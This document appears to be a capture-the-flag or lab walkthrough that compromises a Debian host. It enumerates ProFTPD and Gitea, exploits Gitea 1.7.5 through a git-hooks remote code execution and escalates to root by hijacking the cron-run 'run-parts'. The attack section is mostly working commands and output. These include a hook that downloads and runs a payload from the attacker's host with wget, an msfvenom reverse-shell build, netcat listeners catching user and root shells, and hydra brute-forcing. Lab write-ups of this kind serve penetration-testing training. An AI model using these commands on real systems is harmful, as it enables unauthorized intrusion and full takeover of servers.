## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.237.67

# HOSTNAME                                 //Found post initial foothold
roquefort
# OPERATING SYSTEM                         //Found post initial foothold
cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
VERSION_CODENAME=stretch
ID=debian

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
21/tcp   open   ftp     syn-ack ttl 61 ProFTPD 1.3.5b

3000/tcp open   ppp?    syn-ack ttl 61

22/tcp   open   ssh     syn-ack ttl 61 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)

2222/tcp open   ssh     syn-ack ttl 61 Dropbear sshd 2016.74 (protocol 2.0)
```
# ENUMERATION
## PORT 21
```bash
# Nmap 
- 21/tcp   open   ftp     syn-ack ttl 61 ProFTPD 1.3.5b

sudo nc -nvvv $ip 21  
(UNKNOWN) [192.168.237.67] 21 (ftp) open
220 ProFTPD 1.3.5b Server (Debian) [::ffff:192.168.237.67]

- ProFTPD 1.3.5b Server

searchsploit ProFTPD 1.3.5
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2) | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy | linux/remote/36742.txt

- Need credentials to login

sudo ftp ftp://anonymous:anonymous@$ip
- didin't work

sudo hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f ftp://$ip
- 1 of 1 target completed, 0 valid password found                                                                                                                           
```
## PORT 3000
```bash
sudo curl -I $url
Set-Cookie: i_like_gitea=a288b63be9ecca04
- Seems like gitea

sudo whatweb $url | sed 's/,/\n/g'
http://192.168.237.67:3000 [200 OK] Cookies[_csrf i_like_gitea lang]
 Country[RESERVED][ZZ]
 HTML5
 HttpOnly[_csrf i_like_gitea]
 IP[192.168.237.67]
 JQuery
 Meta-Author[Gitea - Git with a cup of tea]
 Open-Graph-Protocol[website]
 Script
 Title[Gitea: Git with a cup of tea]
 X-Frame-Options[SAMEORIGIN]
 X-UA-Compatible[ie=edge]

sudo curl -vs $url | html2text | less
- Found Gitea Version: 1.7.5

sudo curl -s $url| grep -oP 'href="\K[^"]+' | sort -u | less
/api/swagger
/css/index.css?v=5c3484771d810fb8db11cebf8ccc952f
/explore/repos
/img/favicon.png
/img/gitea-safari.svg
/manifest.json
/user/login?redirect_to=
/user/sign_up
/vendor/assets/font-awesome/css/font-awesome.min.css
/vendor/assets/octicons/octicons.min.css
/vendor/librejs.html
/vendor/plugins/semantic/semantic.min.css

searchsploit gitea 1.7.5
Gitea 1.7.5 - Remote Code Execution | multiple/webapps/49383.py

- Sign in to gitea didn't work with admin:admin
- Created a user with creds test:password123

- Checking exploit reference
https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce

```
## PORT 2222
```bash
2222/tcp open   ssh     syn-ack ttl 61 Dropbear sshd 2016.74 (protocol 2.0)
```
## INITIAL FOOTHOLD
```bash
# Reference - https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce
- Create a repo exp1
- From the repo settings > Git Hooks > pre-receive > Edit
- Paste the code 
wget http://192.168.45.152:21/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell
- update hook

- Reverse shell Exploit 
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=2222 -f elf -o shell

- Host webserver on port 21
sudo python3 -m http.server 21

- Start a listener on port 2222

- Now commit the repo with 
- Creating a new repository on the command line
touch README.md
git init
git add README.md
git commit -m "first commit"
git remote add origin http://192.168.237.67:3000/test/exp1.git
git push -u origin master
Username for 'http://192.168.237.67:3000': test
Password for 'http://test@192.168.237.67:3000': password123

sudo nc -nvlp 2222              
listening on [any] 2222 ...                                                                   
connect to [192.168.45.152] from (UNKNOWN) [192.168.237.67] 59080
id                                          
uid=1000(chloe) gid=1000(chloe) groups=1000(chloe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```
## PRIVILEGE ESCALATION
```bash
- Running linpeas.sh - found writable path /usr/local/bin
chloe@roquefort:/home/chloe/.ssh$ echo $PATH
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.

- Transfer and run pspy
2024/12/09 10:55:01 CMD: UID=0     PID=14345  | run-parts --report /etc/cron.hourly 

# Privesc - the reverse shell we transfered before
cp /tmp/shell /usr/local/bin/run-parts

sudo nc -nvlp 2222
listening on [any] 2222 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.237.67] 59092
id
uid=0(root) gid=0(root) groups=0(root)

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Mon Dec  9 05:23:43 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.237.67
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.0 404 Not Found\r\n(?:[^<]+|<(?!/head>))*?<style>\nbody \{ background-color: #fcfcfc; color: #333333; margin: 0; padding:0; \}\nh1 \{ font-size: 1\.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; \}\nh1, p \{ padding-left: 10px; \}\ncode\.url \{ background-color: #eeeeee; font-family:monospace; padding:0 2px;\}\n</style>'
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.0 404 Not Found\r\n(?:[^<]+|<(?!/head>))*?<style>\nbody \{ background-color: #ffffff; color: #000000; \}\nh1 \{ font-family: sans-serif; font-size: 150%; background-color: #9999cc; font-weight: bold; color: #000000; margin-top: 0;\}\n</style>'
Nmap scan report for 192.168.237.67
Host is up, received echo-reply ttl 61 (0.037s latency).
Scanned at 2024-12-09 05:23:45 IST for 285s
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE  SERVICE REASON         VERSION
21/tcp   open   ftp     syn-ack ttl 61 ProFTPD 1.3.5b
22/tcp   open   ssh     syn-ack ttl 61 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:77:6f:b1:ed:65:b5:ad:14:64:40:d2:24:d3:9c:0d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9yKoYquj+03HzzDt10Vye2nDsQQYflZqSXlNi4CWbk9++xu69PJEgsm0GMczWto1hEV8SG2hLMvP/2EGg7WU+6Dru695SYZhUHAJfJErXptgw3tbkM4id+civEPOYAqatj0HxF29hRV7DU3UYw6koNhpAmgf+B1zlXS4It3iZR7xOdOcSylKKCd0zJDE8VS8udSddyhugxArCMCbiiZD5y7AJ9/IeQ0Jl+t4n0JxF5tELOifQ4seAGtEi3A8gpYav6E81DG9rIwuZdpOVnh3/nZgkwtcaVymXYUTAMPzwLr1cwK5Jd+OMFy6grAZvhjbDxdnHI7WCXo5HXEhVZVG5
|   256 a9:b4:4f:61:2e:2d:9d:4c:48:15:fe:70:8e:fa:af:b3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNKcVXu5Q1QIJE/D7O8GWuavg4Thfp3NQsFXiEnrgjgluRdw0ZQ0bi1raXmVymLKiSSzdO4LTVixBiU+hYvMm4g=
|   256 92:56:eb:af:c9:34:af:ea:a1:cf:9f:e1:90:dd:2f:61 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOTR8UgPY9T6exsIAXVoAiNxWupn0Daf+/Hf6gOUv4zv
53/tcp   closed domain  reset ttl 61
2222/tcp open   ssh     syn-ack ttl 61 Dropbear sshd 2016.74 (protocol 2.0)
3000/tcp open   ppp?    syn-ack ttl 61
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=357dcc9bf1d7d032; Path=/; HttpOnly
|     Set-Cookie: _csrf=ryNG1RVu6DA1rWJInRuZufaK2ko6MTczMzcwMjEzNTM0MzY0MjY1Ng%3D%3D; Path=/; Expires=Mon, 09 Dec 2024 23:55:35 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 08 Dec 2024 23:55:35 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=b9ce8eeafb0eb9b8; Path=/; HttpOnly
|     Set-Cookie: _csrf=2pzDxGGUvWo8Y8qo2kkPVg0me_E6MTczMzcwMjE0MDU2MjY3ODE4Mg%3D%3D; Path=/; Expires=Mon, 09 Dec 2024 23:55:40 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 08 Dec 2024 23:55:40 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|_    navigator.serviceWorker.register('/serviceworker.js').then(function(registration
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=12/9%Time=675631F8%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,1AD8,"HTTP/1\.0\x20200\x20OK\r\nContent-Typ
SF:e:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path
SF:=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=357dcc9bf1d7d0
SF:32;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=ryNG1RVu6DA1rWJInRuZ
SF:ufaK2ko6MTczMzcwMjEzNTM0MzY0MjY1Ng%3D%3D;\x20Path=/;\x20Expires=Mon,\x2
SF:009\x20Dec\x202024\x2023:55:35\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\
SF:x20SAMEORIGIN\r\nDate:\x20Sun,\x2008\x20Dec\x202024\x2023:55:35\x20GMT\
SF:r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head\x20data-suburl=\"\">\n\t<meta\
SF:x20charset=\"utf-8\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=
SF:device-width,\x20initial-scale=1\">\n\t<meta\x20http-equiv=\"x-ua-compa
SF:tible\"\x20content=\"ie=edge\">\n\t<title>Gitea:\x20Git\x20with\x20a\x2
SF:0cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"/manif
SF:est\.json\"\x20crossorigin=\"use-credentials\">\n\t\n\t<script>\n\t\tif
SF:\x20\('serviceWorker'\x20in\x20navigator\)\x20{\n\x20\x20\t\t\twindow\.
SF:addEventListener\('load',\x20function\(\)\x20{\n\x20\x20\x20\x20\t\t\tn
SF:avigator\.serviceWorker\.register\('/serviceworker\.js'\)\.then\(functi
SF:on\(registration\)\x20{\n\x20\x20\x20\x20\x20\x20\t\t\t\t\n\x20\x20\x20
SF:\x20\x20\x20\t\t\t")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(HTTPOptions,1000,"HTTP/1\.0\x20404\x20No
SF:t\x20Found\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cooki
SF:e:\x20lang=en-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_
SF:like_gitea=b9ce8eeafb0eb9b8;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_
SF:csrf=2pzDxGGUvWo8Y8qo2kkPVg0me_E6MTczMzcwMjE0MDU2MjY3ODE4Mg%3D%3D;\x20P
SF:ath=/;\x20Expires=Mon,\x2009\x20Dec\x202024\x2023:55:40\x20GMT;\x20Http
SF:Only\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2008\x20Dec\x2
SF:02024\x2023:55:40\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head\x20da
SF:ta-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=\"viewp
SF:ort\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\t<meta\x
SF:20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t<title>Page
SF:\x20Not\x20Found\x20-\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea
SF:</title>\n\t<link\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20cr
SF:ossorigin=\"use-credentials\">\n\t\n\t<script>\n\t\tif\x20\('serviceWor
SF:ker'\x20in\x20navigator\)\x20{\n\x20\x20\t\t\twindow\.addEventListener\
SF:('load',\x20function\(\)\x20{\n\x20\x20\x20\x20\t\t\tnavigator\.service
SF:Worker\.register\('/serviceworker\.js'\)\.then\(function\(registration"
SF:);
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec  9 05:28:30 2024 -- 1 IP address (1 host up) scanned in 286.96 seconds

```

